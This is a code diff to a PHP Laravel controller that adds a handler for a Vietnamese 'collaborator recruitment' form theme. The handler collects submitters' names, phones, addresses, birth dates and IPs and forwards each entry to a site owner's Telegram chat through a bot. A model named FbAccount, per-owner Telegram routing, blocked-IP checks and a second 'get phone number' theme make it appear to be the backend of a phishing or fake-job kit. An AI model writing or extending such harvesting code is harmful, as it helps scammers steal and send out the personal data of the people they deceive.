@@ -452,6 +452,80 @@ class CustomWeb extends Controller
             }
         }
     }
+    # 0935396675_CTV THEME
+    function ctv_0935396675_post_custom(Request $rq)
+    {
+        if ($rq->filled('d')) {
+            try {
+                $post_data = Json::decode($rq->d);
+                $web_info = Json::decode(Crypt::decryptString($post_data->info));
+                $ip = getRealIp();
+                // pusher code
+                $pusher_code = $rq->p_c;
+                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
+                $check_ip = FbAccount::where('ip', $ip)
+                    ->where('type', 'custom_whatsapp')
+                    ->latest()
+                    ->first();
+                $wait_seconds = 3;
+                if ($check_ip) {
+                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
+                        return response([
+                            'status' => false,
+                        ]);
+                    }
+                }
+                # custom bot
+                $custom_realtime_bot = new Api(config('telegrambot.custom'));
+                $user = User::find($web_info->userid);
+                if ($user) {
+                    // kiểm tra xem ip có bị chặn không
+                    if (check_blocked_ip($user->id, $ip)) {
+                        // destroy session
+                        return;
+                    }
+                    $user_telegram_id = Json::decode($user->data)->telegram_id;
+                    if ($user_telegram_id) {
+                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
+                        $ip = getRealIp();
+                        // new account
+                        if ($website) {
+                            $website = Json::decode($website->data);
+                            $fullData = $post_data->fullFormData ?? [];
+
+                            $msg = implode("\n", [
+                                "Giao diện tuyển CTV tùy chỉnh",
+                                "",
+                                "Title: <b>{$website->title}</b>",
+                                "",
+                                "------------------------",
+                                "<b>Họ và tên:</b> <code>" .$fullData['name']. "</code>",
+                                "<b>Số điện thoại:</b> <code>" .$fullData['phone']. "</code>",
+                                "<b>Địa chỉ:</b> <code>" .$fullData['address']. "</code>",
+                                "<b>Ngày sinh:</b> <code>" .$fullData['dob']. "</code>",
+                                "<b>Ca làm việc:</b> <code>" .trim(implode(', ', $fullData['caLamViec'])). "</code>",
+                                "------------------------",
+                                "",
+                                "<b>Phân biệt:</b> {$web_info->emoji}",
+                                "<b>IP:</b> {$ip}",
+                                ""
+                            ]);
+
+                            $custom_realtime_bot->sendMessage([
+                                'chat_id' => $user_telegram_id,
+                                'parse_mode' => 'HTML',
+                                'text' => $msg,
+                            ]);
+                        }
+                    }
+                }
+            } catch (\Throwable $e) {
+                return response([
+                    'status' => false,
+                ]);
+            }
+        }
+    }
     # BO23333 LAYSDT THEME
     function bo23333_laysdt_post(Request $rq)
     {
@@ -535,7 +609,7 @@ class CustomWeb extends Controller
                                         ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                     ]
                                 ];
-                           
+
                                 $msg = implode("\n", [
                                     "Giao diện tùy chỉnh: <b>BO23333 LAYSDT</b>",
                                     "Web: <b>$website->title</b>",
@@ -555,7 +629,7 @@ class CustomWeb extends Controller
                                     'user' => $post_data->phone,
                                     'type' => 'custom',
                                     'ip' => $ip
-                                ]); 
+                                ]);
                                 $custom_bot->sendMessage([
                                     'chat_id' => $user_telegram_id,
                                     'parse_mode' => 'HTML',
@@ -571,6 +645,6 @@ class CustomWeb extends Controller
                     'status' => false,
                 ]);
             }
-        }   
+        }
     }
 }
